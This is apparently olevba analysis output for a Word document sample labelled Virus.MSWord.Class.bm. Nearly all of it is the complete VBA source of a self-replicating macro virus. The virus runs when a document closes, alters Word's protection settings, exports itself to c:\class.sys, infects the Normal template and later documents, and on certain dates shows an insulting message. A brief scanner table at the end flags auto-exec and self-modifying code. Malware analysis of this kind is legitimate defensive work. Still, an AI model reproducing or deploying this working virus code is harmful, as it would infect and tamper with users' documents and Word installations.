olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.bm-7b05ce03e0fe1d17c4b5ee7e492cb8cd4de6eb2f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.bm-7b05ce03e0fe1d17c4b5ee7e492cb8cd4de6eb2f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
On Error GoTo out
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
Options.VirusProtection = True
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
Options.SaveNormalPrompt = True
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
Options.ConfirmConversions = True
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
If nt > 70 And ad > 0 Then GoTo out
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
If nt < 70 Then
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
End If
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
host.codemodule.AddFromFile ("c:\class.sys")
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
With host.codemodule
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
    For x = 1 To 4
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
    .deletelines 1
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
    Next x
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
End With
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
If nt < 70 Then
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
    With host.codemodule
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
    .replaceline 1, "Sub AutoClose()"
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
    .replaceline 91, "Sub ToolsMacro()"
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
    For x = 70 To 81
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
        .deletelines 62
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
    Next x
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
    .replaceline 35, "    For x = 1 To 4"
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
    End With
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
End If
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
With host.codemodule
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
    For x = 2 To 104 Step 2
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
    Next x
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
End With
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
out:
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
End Sub
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
Sub ToolsMacro()
'Ditry PC7/12/99 5:08:14 PMHP LaserJet 4 on LPT1:DOCUMENT.DOC
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
